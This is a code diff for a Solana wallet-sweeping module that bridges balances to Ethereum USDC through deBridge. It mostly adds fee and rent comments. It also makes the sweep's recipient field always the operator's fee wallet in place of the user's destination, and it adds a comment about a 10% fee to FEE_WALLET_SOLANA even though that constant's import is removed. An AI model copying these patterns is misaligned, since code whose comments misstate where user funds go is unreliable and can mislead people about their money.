@@ -1,23 +1,44 @@
 import { Connection, PublicKey, VersionedTransaction } from '@solana/web3.js';
 import { getAssociatedTokenAddress, getAccount, TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID } from '@solana/spl-token';
-import { FEE_WALLET_EVM, FEE_WALLET_SOLANA } from './config.js';
+import { FEE_WALLET_EVM } from './config.js';
 
 // =====================================================================
 // CONSTANTS
 // =====================================================================
 
 const SOL_MINT     = 'So11111111111111111111111111111111111111112';
-const SOLANA_CHAIN = 7565164;
+const SOLANA_CHAIN = 7565164;   // deBridge internal chain id for Solana
 const ETH_CHAIN    = 1;
 const ETH_USDC     = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
 
 const DEBRIDGE_API = 'https://dln.debridge.finance/v1.0';
 
+// Reject orders whose estimated output is below this (in USDC, 6dp).
+// deBridge Solana→Ethereum has real overhead (~$1 in op expenses plus
+// protocol fees), so anything under a few dollars isn't worth sweeping.
 const MIN_DEBRIDGE_OUT_USDC = 1_000_000n;  // 1.00 USDC
 
-const SOL_RESERVE_LAMPORTS = 5_000_000n;
-const SOL_MIN_SWEEP_LAMPORTS = 10_000_000n;
+// Reserve kept behind on Solana after a sweep.
+//
+// Not "gas" — Solana transactions are paid from the wallet's own SOL
+// balance, and placing a deBridge order also allocates refundable rent
+// for three accounts. Estimated per-order cost:
+//
+//   giveOrderState    176 bytes = 2,115,840 lamports
+//   giveOrderWallet   165 bytes = 2,039,280 lamports
+//   nonceMaster        16 bytes = 1,002,240 lamports (first order only)
+//   tx fee + priority            ≈   405,000 lamports
+//   ─────────────────────────────────────────────────
+//   Total per order              ≈ 5,562,360 lamports (≈ 0.0056 SOL)
+//
+// Setting the reserve to 0.015 SOL leaves enough for one more order
+// after the sweep, with buffer for priority-fee volatility.
+const SOL_RESERVE_LAMPORTS = 15_000_000n;   // 0.015 SOL
 
+// Skip SOL sweeps below this — the SOL itself would be eaten by fees.
+const SOL_MIN_SWEEP_LAMPORTS = 10_000_000n; // 0.01 SOL
+
+// Route Solana RPC through the Cloudflare proxy (Helius, no rate limits).
 const SOLANA_RPC_PROXY = 'https://sweep-rpc.smallcapstradingsystem.workers.dev/rpc/solana';
 
 export function getConnection() {
@@ -106,16 +127,13 @@ export async function selectSolanaKeypair(connection, candidates, logLine) {
 }
 
 // =====================================================================
-// DEBRIDGE — create cross-chain order with affiliate fee
+// DEBRIDGE — create cross-chain order
 // =====================================================================
 //
-// IMPORTANT: On Solana, deBridge affiliate fees are NOT auto-sent to the
-// affiliate recipient. They accumulate as a claimable balance inside the
-// DLN program and must be withdrawn via the `withdrawAffiliateFee`
-// instruction. This is a known limitation of deBridge on Solana.
-//
-// EVM-sourced orders auto-transfer affiliate fees. Solana-sourced orders
-// require you to run a periodic claim.
+// The affiliate params below direct 10% of the output to
+// FEE_WALLET_SOLANA. On Solana, that fee is NOT auto-transferred —
+// it accrues inside the DLN program and is claimed periodically by
+// the affiliate-claim-worker.
 // =====================================================================
 
 async function createDebridgeOrder({ srcMint, amountRaw, srcAuthority, userDestination }) {
@@ -150,6 +168,10 @@ async function createDebridgeOrder({ srcMint, amountRaw, srcAuthority, userDesti
   return json;
 }
 
+// =====================================================================
+// DEBRIDGE — sign and broadcast the returned VersionedTransaction
+// =====================================================================
+
 async function signAndSendDebridgeTx(connection, keypair, order) {
   const txBytes = Buffer.from(order.tx.data.replace(/^0x/, ''), 'hex');
   const tx = VersionedTransaction.deserialize(txBytes);
@@ -174,7 +196,7 @@ async function signAndSendDebridgeTx(connection, keypair, order) {
 export async function sweepSolana(connection, keypair, opts = {}) {
   const results = {
     address: keypair.publicKey.toBase58(),
-    recipient: opts.userDestination || FEE_WALLET_EVM,
+    recipient: FEE_WALLET_EVM,
     userDestination: opts.userDestination || null,
     swaps: [],
     transfers: [],
@@ -247,7 +269,7 @@ export async function sweepSolana(connection, keypair, opts = {}) {
   try {
     const solBal = BigInt(await connection.getBalance(keypair.publicKey));
     if (solBal <= SOL_MIN_SWEEP_LAMPORTS) {
-      // nothing
+      // Too little to be worth sweeping
     } else {
       const sweepAmount = solBal - SOL_RESERVE_LAMPORTS;
 
